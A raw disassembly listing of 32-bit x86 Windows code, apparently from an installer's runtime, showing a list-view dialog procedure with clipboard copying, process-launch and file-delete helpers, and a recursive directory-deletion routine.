  405783:	55                   	push   %ebp
  405784:	8b ec                	mov    %esp,%ebp
  405786:	83 ec 40             	sub    $0x40,%esp
  405789:	53                   	push   %ebx
  40578a:	56                   	push   %esi
  40578b:	8b 35 e4 36 43 00    	mov    0x4336e4,%esi
  405791:	33 db                	xor    %ebx,%ebx
  405793:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  40579a:	57                   	push   %edi
  40579b:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40579e:	0f 85 89 01 00 00    	jne    0x40592d
  4057a4:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  4057a8:	83 4d dc ff          	orl    $0xffffffff,-0x24(%ebp)
  4057ac:	6a 02                	push   $0x2
  4057ae:	33 c0                	xor    %eax,%eax
  4057b0:	5e                   	pop    %esi
  4057b1:	8d 7d e0             	lea    -0x20(%ebp),%edi
  4057b4:	89 75 c8             	mov    %esi,-0x38(%ebp)
  4057b7:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4057ba:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  4057bd:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  4057c0:	ab                   	stos   %eax,%es:(%edi)
  4057c1:	ab                   	stos   %eax,%es:(%edi)
  4057c2:	a1 10 47 43 00       	mov    0x434710,%eax
  4057c7:	8b 3d 3c 82 40 00    	mov    0x40823c,%edi
  4057cd:	68 03 04 00 00       	push   $0x403
  4057d2:	8b 48 5c             	mov    0x5c(%eax),%ecx
  4057d5:	8b 40 60             	mov    0x60(%eax),%eax
  4057d8:	ff 75 08             	push   0x8(%ebp)
  4057db:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  4057de:	89 45 10             	mov    %eax,0x10(%ebp)
  4057e1:	ff d7                	call   *%edi
  4057e3:	68 ee 03 00 00       	push   $0x3ee
  4057e8:	a3 d0 36 43 00       	mov    %eax,0x4336d0
  4057ed:	ff 75 08             	push   0x8(%ebp)
  4057f0:	ff d7                	call   *%edi
  4057f2:	68 f8 03 00 00       	push   $0x3f8
  4057f7:	a3 c8 36 43 00       	mov    %eax,0x4336c8
  4057fc:	ff 75 08             	push   0x8(%ebp)
  4057ff:	ff d7                	call   *%edi
  405801:	ff 35 d0 36 43 00    	push   0x4336d0
  405807:	a3 e4 36 43 00       	mov    %eax,0x4336e4
  40580c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40580f:	e8 5f ed ff ff       	call   0x404573
  405814:	6a 04                	push   $0x4
  405816:	e8 b1 f6 ff ff       	call   0x404ecc
  40581b:	a3 d4 36 43 00       	mov    %eax,0x4336d4
  405820:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405823:	50                   	push   %eax
  405824:	89 1d ec 36 43 00    	mov    %ebx,0x4336ec
  40582a:	ff 75 fc             	push   -0x4(%ebp)
  40582d:	ff 15 64 82 40 00    	call   *0x408264
  405833:	56                   	push   %esi
  405834:	ff 15 88 82 40 00    	call   *0x408288
  40583a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40583d:	8b 35 58 82 40 00    	mov    0x408258,%esi
  405843:	2b c8                	sub    %eax,%ecx
  405845:	8d 45 c8             	lea    -0x38(%ebp),%eax
  405848:	50                   	push   %eax
  405849:	53                   	push   %ebx
  40584a:	68 61 10 00 00       	push   $0x1061
  40584f:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  405852:	ff 75 fc             	push   -0x4(%ebp)
  405855:	ff d6                	call   *%esi
  405857:	b8 00 40 00 00       	mov    $0x4000,%eax
  40585c:	50                   	push   %eax
  40585d:	50                   	push   %eax
  40585e:	68 36 10 00 00       	push   $0x1036
  405863:	ff 75 fc             	push   -0x4(%ebp)
  405866:	ff d6                	call   *%esi
  405868:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  40586b:	7c 1c                	jl     0x405889
  40586d:	ff 75 0c             	push   0xc(%ebp)
  405870:	53                   	push   %ebx
  405871:	68 01 10 00 00       	push   $0x1001
  405876:	ff 75 fc             	push   -0x4(%ebp)
  405879:	ff d6                	call   *%esi
  40587b:	ff 75 0c             	push   0xc(%ebp)
  40587e:	53                   	push   %ebx
  40587f:	68 26 10 00 00       	push   $0x1026
  405884:	ff 75 fc             	push   -0x4(%ebp)
  405887:	ff d6                	call   *%esi
  405889:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  40588c:	7c 0e                	jl     0x40589c
  40588e:	ff 75 10             	push   0x10(%ebp)
  405891:	53                   	push   %ebx
  405892:	68 24 10 00 00       	push   $0x1024
  405897:	ff 75 fc             	push   -0x4(%ebp)
  40589a:	ff d6                	call   *%esi
  40589c:	8b 45 14             	mov    0x14(%ebp),%eax
  40589f:	ff 70 30             	push   0x30(%eax)
  4058a2:	6a 1b                	push   $0x1b
  4058a4:	ff 75 08             	push   0x8(%ebp)
  4058a7:	e8 92 ec ff ff       	call   0x40453e
  4058ac:	f6 05 18 47 43 00 03 	testb  $0x3,0x434718
  4058b3:	74 34                	je     0x4058e9
  4058b5:	53                   	push   %ebx
  4058b6:	ff 35 d0 36 43 00    	push   0x4336d0
  4058bc:	ff 15 28 82 40 00    	call   *0x408228
  4058c2:	f6 05 18 47 43 00 02 	testb  $0x2,0x434718
  4058c9:	75 0d                	jne    0x4058d8
  4058cb:	6a 08                	push   $0x8
  4058cd:	ff 75 fc             	push   -0x4(%ebp)
  4058d0:	ff 15 28 82 40 00    	call   *0x408228
  4058d6:	eb 06                	jmp    0x4058de
  4058d8:	89 1d d0 36 43 00    	mov    %ebx,0x4336d0
  4058de:	ff 35 c8 36 43 00    	push   0x4336c8
  4058e4:	e8 8a ec ff ff       	call   0x404573
  4058e9:	68 ec 03 00 00       	push   $0x3ec
  4058ee:	ff 75 08             	push   0x8(%ebp)
  4058f1:	ff d7                	call   *%edi
  4058f3:	68 00 00 30 75       	push   $0x75300000
  4058f8:	8b f8                	mov    %eax,%edi
  4058fa:	53                   	push   %ebx
  4058fb:	68 01 04 00 00       	push   $0x401
  405900:	57                   	push   %edi
  405901:	ff d6                	call   *%esi
  405903:	f6 05 18 47 43 00 04 	testb  $0x4,0x434718
  40590a:	0f 84 fc 01 00 00    	je     0x405b0c
  405910:	ff 75 10             	push   0x10(%ebp)
  405913:	53                   	push   %ebx
  405914:	68 09 04 00 00       	push   $0x409
  405919:	57                   	push   %edi
  40591a:	ff d6                	call   *%esi
  40591c:	ff 75 0c             	push   0xc(%ebp)
  40591f:	53                   	push   %ebx
  405920:	68 01 20 00 00       	push   $0x2001
  405925:	57                   	push   %edi
  405926:	ff d6                	call   *%esi
  405928:	e9 df 01 00 00       	jmp    0x405b0c
  40592d:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  405934:	75 28                	jne    0x40595e
  405936:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405939:	50                   	push   %eax
  40593a:	53                   	push   %ebx
  40593b:	68 ec 03 00 00       	push   $0x3ec
  405940:	ff 75 08             	push   0x8(%ebp)
  405943:	ff 15 3c 82 40 00    	call   *0x40823c
  405949:	50                   	push   %eax
  40594a:	68 17 57 40 00       	push   $0x405717
  40594f:	53                   	push   %ebx
  405950:	53                   	push   %ebx
  405951:	ff 15 84 80 40 00    	call   *0x408084
  405957:	50                   	push   %eax
  405958:	ff 15 fc 80 40 00    	call   *0x4080fc
  40595e:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  405965:	8b 3d 28 82 40 00    	mov    0x408228,%edi
  40596b:	75 1c                	jne    0x405989
  40596d:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  405973:	75 39                	jne    0x4059ae
  405975:	53                   	push   %ebx
  405976:	ff 35 d0 36 43 00    	push   0x4336d0
  40597c:	ff d7                	call   *%edi
  40597e:	6a 08                	push   $0x8
  405980:	56                   	push   %esi
  405981:	ff d7                	call   *%edi
  405983:	56                   	push   %esi
  405984:	e8 ea eb ff ff       	call   0x404573
  405989:	33 f6                	xor    %esi,%esi
  40598b:	46                   	inc    %esi
  40598c:	81 7d 0c 04 04 00 00 	cmpl   $0x404,0xc(%ebp)
  405993:	75 54                	jne    0x4059e9
  405995:	39 1d cc 36 43 00    	cmp    %ebx,0x4336cc
  40599b:	74 26                	je     0x4059c3
  40599d:	6a 78                	push   $0x78
  40599f:	c7 05 38 b2 42 00 02 	movl   $0x2,0x42b238
  4059a6:	00 00 00 
  4059a9:	e8 69 eb ff ff       	call   0x404517
  4059ae:	ff 75 14             	push   0x14(%ebp)
  4059b1:	ff 75 10             	push   0x10(%ebp)
  4059b4:	ff 75 0c             	push   0xc(%ebp)
  4059b7:	e8 e9 eb ff ff       	call   0x4045a5
  4059bc:	5f                   	pop    %edi
  4059bd:	5e                   	pop    %esi
  4059be:	5b                   	pop    %ebx
  4059bf:	c9                   	leave
  4059c0:	c2 10 00             	ret    $0x10
  4059c3:	6a 08                	push   $0x8
  4059c5:	ff 35 08 47 43 00    	push   0x434708
  4059cb:	ff d7                	call   *%edi
  4059cd:	39 1d 8c 47 43 00    	cmp    %ebx,0x43478c
  4059d3:	75 0e                	jne    0x4059e3
  4059d5:	a1 40 ba 42 00       	mov    0x42ba40,%eax
  4059da:	53                   	push   %ebx
  4059db:	ff 70 34             	push   0x34(%eax)
  4059de:	e8 61 fc ff ff       	call   0x405644
  4059e3:	56                   	push   %esi
  4059e4:	e8 2e eb ff ff       	call   0x404517
  4059e9:	83 7d 0c 7b          	cmpl   $0x7b,0xc(%ebp)
  4059ed:	75 bf                	jne    0x4059ae
  4059ef:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4059f2:	39 45 10             	cmp    %eax,0x10(%ebp)
  4059f5:	75 b7                	jne    0x4059ae
  4059f7:	53                   	push   %ebx
  4059f8:	53                   	push   %ebx
  4059f9:	68 04 10 00 00       	push   $0x1004
  4059fe:	50                   	push   %eax
  4059ff:	ff 15 58 82 40 00    	call   *0x408258
  405a05:	3b c3                	cmp    %ebx,%eax
  405a07:	89 45 0c             	mov    %eax,0xc(%ebp)
  405a0a:	0f 8e fc 00 00 00    	jle    0x405b0c
  405a10:	ff 15 98 81 40 00    	call   *0x408198
  405a16:	6a e1                	push   $0xffffffe1
  405a18:	53                   	push   %ebx
  405a19:	8b f8                	mov    %eax,%edi
  405a1b:	e8 dc 0b 00 00       	call   0x4065fc
  405a20:	50                   	push   %eax
  405a21:	56                   	push   %esi
  405a22:	53                   	push   %ebx
  405a23:	57                   	push   %edi
  405a24:	ff 15 9c 81 40 00    	call   *0x40819c
  405a2a:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405a2d:	0f bf 45 14          	movswl 0x14(%ebp),%eax
  405a31:	c1 e9 10             	shr    $0x10,%ecx
  405a34:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  405a38:	0f bf c9             	movswl %cx,%ecx
  405a3b:	75 13                	jne    0x405a50
  405a3d:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405a40:	50                   	push   %eax
  405a41:	ff 75 fc             	push   -0x4(%ebp)
  405a44:	ff 15 e8 81 40 00    	call   *0x4081e8
  405a4a:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405a4d:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405a50:	53                   	push   %ebx
  405a51:	ff 75 08             	push   0x8(%ebp)
  405a54:	53                   	push   %ebx
  405a55:	51                   	push   %ecx
  405a56:	50                   	push   %eax
  405a57:	68 80 01 00 00       	push   $0x180
  405a5c:	57                   	push   %edi
  405a5d:	ff 15 a0 81 40 00    	call   *0x4081a0
  405a63:	3b c6                	cmp    %esi,%eax
  405a65:	0f 85 a1 00 00 00    	jne    0x405b0c
  405a6b:	8b 45 0c             	mov    0xc(%ebp),%eax
  405a6e:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  405a71:	c7 45 d4 68 ca 42 00 	movl   $0x42ca68,-0x2c(%ebp)
  405a78:	c7 45 d8 00 10 00 00 	movl   $0x1000,-0x28(%ebp)
  405a7f:	89 45 08             	mov    %eax,0x8(%ebp)
  405a82:	bf 73 10 00 00       	mov    $0x1073,%edi
  405a87:	ff 4d 08             	decl   0x8(%ebp)
  405a8a:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405a8d:	50                   	push   %eax
  405a8e:	ff 75 08             	push   0x8(%ebp)
  405a91:	57                   	push   %edi
  405a92:	ff 75 fc             	push   -0x4(%ebp)
  405a95:	ff 15 58 82 40 00    	call   *0x408258
  405a9b:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  405a9e:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  405aa2:	75 e3                	jne    0x405a87
  405aa4:	53                   	push   %ebx
  405aa5:	ff 15 a4 81 40 00    	call   *0x4081a4
  405aab:	ff 15 a8 81 40 00    	call   *0x4081a8
  405ab1:	8d 04 36             	lea    (%esi,%esi,1),%eax
  405ab4:	50                   	push   %eax
  405ab5:	6a 42                	push   $0x42
  405ab7:	ff 15 10 81 40 00    	call   *0x408110
  405abd:	50                   	push   %eax
  405abe:	89 45 08             	mov    %eax,0x8(%ebp)
  405ac1:	ff 15 88 80 40 00    	call   *0x408088
  405ac7:	8b f0                	mov    %eax,%esi
  405ac9:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405acc:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  405acf:	50                   	push   %eax
  405ad0:	53                   	push   %ebx
  405ad1:	57                   	push   %edi
  405ad2:	ff 75 fc             	push   -0x4(%ebp)
  405ad5:	ff 15 58 82 40 00    	call   *0x408258
  405adb:	8d 34 46             	lea    (%esi,%eax,2),%esi
  405ade:	66 c7 06 0d 00       	movw   $0xd,(%esi)
  405ae3:	46                   	inc    %esi
  405ae4:	46                   	inc    %esi
  405ae5:	66 c7 06 0a 00       	movw   $0xa,(%esi)
  405aea:	46                   	inc    %esi
  405aeb:	46                   	inc    %esi
  405aec:	43                   	inc    %ebx
  405aed:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  405af0:	7c d7                	jl     0x405ac9
  405af2:	ff 75 08             	push   0x8(%ebp)
  405af5:	ff 15 8c 80 40 00    	call   *0x40808c
  405afb:	ff 75 08             	push   0x8(%ebp)
  405afe:	6a 0d                	push   $0xd
  405b00:	ff 15 ac 81 40 00    	call   *0x4081ac
  405b06:	ff 15 b0 81 40 00    	call   *0x4081b0
  405b0c:	33 c0                	xor    %eax,%eax
  405b0e:	e9 a9 fe ff ff       	jmp    0x4059bc
  405b13:	55                   	push   %ebp
  405b14:	8b ec                	mov    %esp,%ebp
  405b16:	83 ec 20             	sub    $0x20,%esp
  405b19:	b8 f0 83 40 00       	mov    $0x4083f0,%eax
  405b1e:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
  405b22:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405b25:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405b28:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405b2b:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  405b2f:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405b33:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405b36:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405b39:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
  405b3d:	50                   	push   %eax
  405b3e:	66 c7 45 e2 04 00    	movw   $0x4,-0x1e(%ebp)
  405b44:	ff 75 08             	push   0x8(%ebp)
  405b47:	c7 45 f0 e0 83 40 00 	movl   $0x4083e0,-0x10(%ebp)
  405b4e:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  405b55:	ff 15 80 80 40 00    	call   *0x408080
  405b5b:	85 c0                	test   %eax,%eax
  405b5d:	74 04                	je     0x405b63
  405b5f:	33 c0                	xor    %eax,%eax
  405b61:	eb 06                	jmp    0x405b69
  405b63:	ff 15 c8 80 40 00    	call   *0x4080c8
  405b69:	c9                   	leave
  405b6a:	c2 04 00             	ret    $0x4
  405b6d:	6a 00                	push   $0x0
  405b6f:	ff 74 24 08          	push   0x8(%esp)
  405b73:	ff 15 80 80 40 00    	call   *0x408080
  405b79:	85 c0                	test   %eax,%eax
  405b7b:	74 04                	je     0x405b81
  405b7d:	33 c0                	xor    %eax,%eax
  405b7f:	eb 06                	jmp    0x405b87
  405b81:	ff 15 c8 80 40 00    	call   *0x4080c8
  405b87:	c2 04 00             	ret    $0x4
  405b8a:	6a 06                	push   $0x6
  405b8c:	e8 22 0e 00 00       	call   0x4069b3
  405b91:	85 c0                	test   %eax,%eax
  405b93:	74 0a                	je     0x405b9f
  405b95:	ff d0                	call   *%eax
  405b97:	85 c0                	test   %eax,%eax
  405b99:	74 04                	je     0x405b9f
  405b9b:	33 c0                	xor    %eax,%eax
  405b9d:	40                   	inc    %eax
  405b9e:	c3                   	ret
  405b9f:	33 c0                	xor    %eax,%eax
  405ba1:	c3                   	ret
  405ba2:	55                   	push   %ebp
  405ba3:	8b ec                	mov    %esp,%ebp
  405ba5:	83 ec 10             	sub    $0x10,%esp
  405ba8:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405bab:	c7 05 70 fa 42 00 44 	movl   $0x44,0x42fa70
  405bb2:	00 00 00 
  405bb5:	50                   	push   %eax
  405bb6:	33 c0                	xor    %eax,%eax
  405bb8:	68 70 fa 42 00       	push   $0x42fa70
  405bbd:	50                   	push   %eax
  405bbe:	50                   	push   %eax
  405bbf:	68 00 00 00 04       	push   $0x4000000
  405bc4:	50                   	push   %eax
  405bc5:	50                   	push   %eax
  405bc6:	50                   	push   %eax
  405bc7:	ff 75 08             	push   0x8(%ebp)
  405bca:	50                   	push   %eax
  405bcb:	ff 15 7c 80 40 00    	call   *0x40807c
  405bd1:	85 c0                	test   %eax,%eax
  405bd3:	74 0c                	je     0x405be1
  405bd5:	ff 75 f4             	push   -0xc(%ebp)
  405bd8:	ff 15 fc 80 40 00    	call   *0x4080fc
  405bde:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405be1:	c9                   	leave
  405be2:	c2 04 00             	ret    $0x4
  405be5:	8b 44 24 04          	mov    0x4(%esp),%eax
  405be9:	50                   	push   %eax
  405bea:	83 60 24 00          	andl   $0x0,0x24(%eax)
  405bee:	c7 00 3c 00 00 00    	movl   $0x3c,(%eax)
  405bf4:	ff 15 84 81 40 00    	call   *0x408184
  405bfa:	c2 04 00             	ret    $0x4
  405bfd:	ff 25 94 81 40 00    	jmp    *0x408194
  405c03:	68 00 04 00 00       	push   $0x400
  405c08:	ff 74 24 0c          	push   0xc(%esp)
  405c0c:	ff 74 24 0c          	push   0xc(%esp)
  405c10:	ff 35 d8 36 43 00    	push   0x4336d8
  405c16:	ff 15 90 81 40 00    	call   *0x408190
  405c1c:	c2 08 00             	ret    $0x8
  405c1f:	8b 44 24 08          	mov    0x8(%esp),%eax
  405c23:	8b c8                	mov    %eax,%ecx
  405c25:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  405c2b:	83 3d a0 47 43 00 00 	cmpl   $0x0,0x4347a0
  405c32:	74 05                	je     0x405c39
  405c34:	c1 e8 15             	shr    $0x15,%eax
  405c37:	75 47                	jne    0x405c80
  405c39:	83 3d a8 47 43 00 00 	cmpl   $0x0,0x4347a8
  405c40:	74 06                	je     0x405c48
  405c42:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  405c48:	a1 08 47 43 00       	mov    0x434708,%eax
  405c4d:	68 b0 a3 40 00       	push   $0x40a3b0
  405c52:	a3 b4 a3 40 00       	mov    %eax,0x40a3b4
  405c57:	a1 00 47 43 00       	mov    0x434700,%eax
  405c5c:	a3 b8 a3 40 00       	mov    %eax,0x40a3b8
  405c61:	8b 44 24 08          	mov    0x8(%esp),%eax
  405c65:	a3 bc a3 40 00       	mov    %eax,0x40a3bc
  405c6a:	c7 05 c0 a3 40 00 00 	movl   $0x433700,0x40a3c0
  405c71:	37 43 00 
  405c74:	89 0d c4 a3 40 00    	mov    %ecx,0x40a3c4
  405c7a:	ff 15 8c 81 40 00    	call   *0x40818c
  405c80:	c2 08 00             	ret    $0x8
  405c83:	56                   	push   %esi
  405c84:	8b 74 24 08          	mov    0x8(%esp),%esi
  405c88:	57                   	push   %edi
  405c89:	56                   	push   %esi
  405c8a:	e8 fb 03 00 00       	call   0x40608a
  405c8f:	8b f8                	mov    %eax,%edi
  405c91:	83 ff ff             	cmp    $0xffffffff,%edi
  405c94:	74 2e                	je     0x405cc4
  405c96:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  405c9b:	56                   	push   %esi
  405c9c:	74 08                	je     0x405ca6
  405c9e:	ff 15 78 80 40 00    	call   *0x408078
  405ca4:	eb 06                	jmp    0x405cac
  405ca6:	ff 15 44 81 40 00    	call   *0x408144
  405cac:	85 c0                	test   %eax,%eax
  405cae:	74 05                	je     0x405cb5
  405cb0:	33 c0                	xor    %eax,%eax
  405cb2:	40                   	inc    %eax
  405cb3:	eb 11                	jmp    0x405cc6
  405cb5:	f6 44 24 10 04       	testb  $0x4,0x10(%esp)
  405cba:	75 08                	jne    0x405cc4
  405cbc:	57                   	push   %edi
  405cbd:	56                   	push   %esi
  405cbe:	ff 15 d8 80 40 00    	call   *0x4080d8
  405cc4:	33 c0                	xor    %eax,%eax
  405cc6:	5f                   	pop    %edi
  405cc7:	5e                   	pop    %esi
  405cc8:	c2 08 00             	ret    $0x8
  405ccb:	55                   	push   %ebp
  405ccc:	8b ec                	mov    %esp,%ebp
  405cce:	81 ec 58 02 00 00    	sub    $0x258,%esp
  405cd4:	53                   	push   %ebx
  405cd5:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405cd8:	56                   	push   %esi
  405cd9:	57                   	push   %edi
  405cda:	8b 7d 08             	mov    0x8(%ebp),%edi
  405cdd:	8b c3                	mov    %ebx,%eax
  405cdf:	83 e0 04             	and    $0x4,%eax
  405ce2:	57                   	push   %edi
  405ce3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405ce6:	e8 ab 02 00 00       	call   0x405f96
  405ceb:	f6 c3 08             	test   $0x8,%bl
  405cee:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405cf1:	74 17                	je     0x405d0a
  405cf3:	57                   	push   %edi
  405cf4:	ff 15 44 81 40 00    	call   *0x408144
  405cfa:	f7 d8                	neg    %eax
  405cfc:	1b c0                	sbb    %eax,%eax
  405cfe:	40                   	inc    %eax
  405cff:	01 05 88 47 43 00    	add    %eax,0x434788
  405d05:	e9 7d 01 00 00       	jmp    0x405e87
  405d0a:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405d0d:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  405d11:	74 11                	je     0x405d24
  405d13:	85 c0                	test   %eax,%eax
  405d15:	0f 84 1a 01 00 00    	je     0x405e35
  405d1b:	f6 c3 02             	test   $0x2,%bl
  405d1e:	0f 84 11 01 00 00    	je     0x405e35
  405d24:	be 70 ea 42 00       	mov    $0x42ea70,%esi
  405d29:	57                   	push   %edi
  405d2a:	56                   	push   %esi
  405d2b:	e8 8f 08 00 00       	call   0x4065bf
  405d30:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405d34:	74 0d                	je     0x405d43
  405d36:	68 6c a5 40 00       	push   $0x40a56c
  405d3b:	56                   	push   %esi
  405d3c:	e8 9a 08 00 00       	call   0x4065db
  405d41:	eb 06                	jmp    0x405d49
  405d43:	57                   	push   %edi
  405d44:	e8 91 01 00 00       	call   0x405eda
  405d49:	66 83 3f 00          	cmpw   $0x0,(%edi)
  405d4d:	75 0a                	jne    0x405d59
  405d4f:	66 83 3d 70 ea 42 00 	cmpw   $0x5c,0x42ea70
  405d56:	5c 
  405d57:	75 0b                	jne    0x405d64
  405d59:	68 14 a0 40 00       	push   $0x40a014
  405d5e:	57                   	push   %edi
  405d5f:	e8 77 08 00 00       	call   0x4065db
  405d64:	57                   	push   %edi
  405d65:	e8 6b 08 00 00       	call   0x4065d5
  405d6a:	8d 1c 47             	lea    (%edi,%eax,2),%ebx
  405d6d:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405d73:	50                   	push   %eax
  405d74:	56                   	push   %esi
  405d75:	ff 15 40 81 40 00    	call   *0x408140
  405d7b:	8b f0                	mov    %eax,%esi
  405d7d:	83 fe ff             	cmp    $0xffffffff,%esi
  405d80:	0f 84 a4 00 00 00    	je     0x405e2a
  405d86:	66 83 bd d4 fd ff ff 	cmpw   $0x2e,-0x22c(%ebp)
  405d8d:	2e 
  405d8e:	75 1e                	jne    0x405dae
  405d90:	66 83 bd d6 fd ff ff 	cmpw   $0x0,-0x22a(%ebp)
  405d97:	00 
  405d98:	74 73                	je     0x405e0d
  405d9a:	66 83 bd d6 fd ff ff 	cmpw   $0x2e,-0x22a(%ebp)
  405da1:	2e 
  405da2:	75 0a                	jne    0x405dae
  405da4:	66 83 bd d8 fd ff ff 	cmpw   $0x0,-0x228(%ebp)
  405dab:	00 
  405dac:	74 5f                	je     0x405e0d
  405dae:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  405db4:	50                   	push   %eax
  405db5:	53                   	push   %ebx
  405db6:	e8 04 08 00 00       	call   0x4065bf
  405dbb:	f6 85 a8 fd ff ff 10 	testb  $0x10,-0x258(%ebp)
  405dc2:	74 15                	je     0x405dd9
  405dc4:	8b 45 0c             	mov    0xc(%ebp),%eax
  405dc7:	83 e0 03             	and    $0x3,%eax
  405dca:	3c 03                	cmp    $0x3,%al
  405dcc:	75 3f                	jne    0x405e0d
  405dce:	ff 75 0c             	push   0xc(%ebp)
  405dd1:	57                   	push   %edi
  405dd2:	e8 f4 fe ff ff       	call   0x405ccb
  405dd7:	eb 34                	jmp    0x405e0d
  405dd9:	ff 75 fc             	push   -0x4(%ebp)
  405ddc:	57                   	push   %edi
  405ddd:	e8 a1 fe ff ff       	call   0x405c83
  405de2:	85 c0                	test   %eax,%eax
  405de4:	75 1f                	jne    0x405e05
  405de6:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  405de9:	74 12                	je     0x405dfd
  405deb:	57                   	push   %edi
  405dec:	6a f1                	push   $0xfffffff1
  405dee:	e8 51 f8 ff ff       	call   0x405644
  405df3:	6a 00                	push   $0x0
  405df5:	57                   	push   %edi
  405df6:	e8 84 05 00 00       	call   0x40637f
  405dfb:	eb 10                	jmp    0x405e0d
  405dfd:	ff 05 88 47 43 00    	incl   0x434788
  405e03:	eb 08                	jmp    0x405e0d
  405e05:	57                   	push   %edi
  405e06:	6a f2                	push   $0xfffffff2
  405e08:	e8 37 f8 ff ff       	call   0x405644
  405e0d:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405e13:	50                   	push   %eax
  405e14:	56                   	push   %esi
  405e15:	ff 15 3c 81 40 00    	call   *0x40813c
  405e1b:	85 c0                	test   %eax,%eax
  405e1d:	0f 85 63 ff ff ff    	jne    0x405d86
  405e23:	56                   	push   %esi
  405e24:	ff 15 38 81 40 00    	call   *0x408138
  405e2a:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405e2e:	74 05                	je     0x405e35
  405e30:	66 83 63 fe 00       	andw   $0x0,-0x2(%ebx)
  405e35:	33 f6                	xor    %esi,%esi
  405e37:	39 75 08             	cmp    %esi,0x8(%ebp)
  405e3a:	74 4b                	je     0x405e87
  405e3c:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  405e3f:	75 08                	jne    0x405e49
  405e41:	ff 05 88 47 43 00    	incl   0x434788
  405e47:	eb 3e                	jmp    0x405e87
  405e49:	57                   	push   %edi
  405e4a:	e8 cd 0a 00 00       	call   0x40691c
  405e4f:	85 c0                	test   %eax,%eax
  405e51:	74 34                	je     0x405e87
  405e53:	57                   	push   %edi
  405e54:	e8 35 00 00 00       	call   0x405e8e
  405e59:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405e5c:	0c 01                	or     $0x1,%al
  405e5e:	50                   	push   %eax
  405e5f:	57                   	push   %edi
  405e60:	e8 1e fe ff ff       	call   0x405c83
  405e65:	85 c0                	test   %eax,%eax
  405e67:	75 16                	jne    0x405e7f
  405e69:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  405e6c:	74 d3                	je     0x405e41
  405e6e:	57                   	push   %edi
  405e6f:	6a f1                	push   $0xfffffff1
  405e71:	e8 ce f7 ff ff       	call   0x405644
  405e76:	56                   	push   %esi
  405e77:	57                   	push   %edi
  405e78:	e8 02 05 00 00       	call   0x40637f
  405e7d:	eb 08                	jmp    0x405e87
  405e7f:	57                   	push   %edi
  405e80:	6a e5                	push   $0xffffffe5
  405e82:	e8 bd f7 ff ff       	call   0x405644
  405e87:	5f                   	pop    %edi
  405e88:	5e                   	pop    %esi
  405e89:	5b                   	pop    %ebx
  405e8a:	c9                   	leave
  405e8b:	c2 08 00             	ret    $0x8
  405e8e:	56                   	push   %esi
  405e8f:	8b 74 24 08          	mov    0x8(%esp),%esi
  405e93:	56                   	push   %esi
  405e94:	e8 3c 07 00 00       	call   0x4065d5
  405e99:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405e9c:	50                   	push   %eax
  405e9d:	56                   	push   %esi
  405e9e:	ff 15 fc 81 40 00    	call   *0x4081fc
  405ea4:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405ea8:	74 0b                	je     0x405eb5
  405eaa:	68 14 a0 40 00       	push   $0x40a014
  405eaf:	56                   	push   %esi
  405eb0:	e8 26 07 00 00       	call   0x4065db
  405eb5:	8b c6                	mov    %esi,%eax
  405eb7:	5e                   	pop    %esi
  405eb8:	c2 04 00             	ret    $0x4
  405ebb:	8b 44 24 04          	mov    0x4(%esp),%eax
  405ebf:	eb 0e                	jmp    0x405ecf
